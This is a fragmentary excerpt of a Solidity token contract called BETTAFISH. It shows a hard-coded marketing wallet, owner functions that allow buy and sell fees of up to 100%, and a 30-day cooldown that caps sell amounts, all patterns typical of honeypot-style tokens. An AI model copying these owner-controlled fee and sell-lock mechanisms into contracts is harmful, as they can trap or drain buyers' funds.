...
contract BETTAFISH is Context, IERC20, Ownable {
    ...
    uint256 private _tTotal = 10 * 10**10 * 10**9; //100B Supply
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _tFeeTotal;
    address payable public _marketingAddress = payable(address(0x3315814d4795781B324df99bBdf87eCA4cc50714));
	
    string private _name = "BETTAFISH";
    string private _symbol = "BETTAFISH";
    ...
    uint256 public cooldownTime = 43200 minutes; 
    ...
    constructor() {
        ...
        buyFee.dev = _buyTaxFee;
        sellFee.dev = _sellTaxFee;

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
			0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3 //Mainet
        );
    ...
    function setSellFee(
		...
		require(tax + dev <= 100, "SellFee exceed 100");	
		emit SellFeeUpdated(sellFee.tax, sellFee.dev, tax, dev);		
    ...
    function setBuyFee(
		...
		require(tax + dev <= 100, "BuyFee exceed 100");	
		emit BuyFeeUpdated(buyFee.tax, buyFee.dev, tax, dev);	
        buyFee.tax = tax;
        buyFee.dev = dev;
    }
        ...
        )
    {
        ...
        uint256 rMarketing = tDev.mul(currentRate);
    ...
    function calculateCooldownAmountLimit(address sender) public view returns (uint256) {
        ...
        if(listedAt + (6 * cooldownTime) < block.timestamp) return currentBalance;
    ...
    function setBuy() private {
        _taxFee = buyFee.tax;
        _marketingFee = buyFee.dev;
    }

    function setSell() private {
        _taxFee = sellFee.tax;
        _marketingFee = sellFee.dev;
    }
    ...
    function _transferBothExcluded(
        ...
        address recipient,
        uint256 tAmount
    ) private {(uint256 tTransferAmount, uint256 tFee, uint256 tDev) = _getTValues(tAmount);
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(
            tAmount,
            tFee,
            tDev,
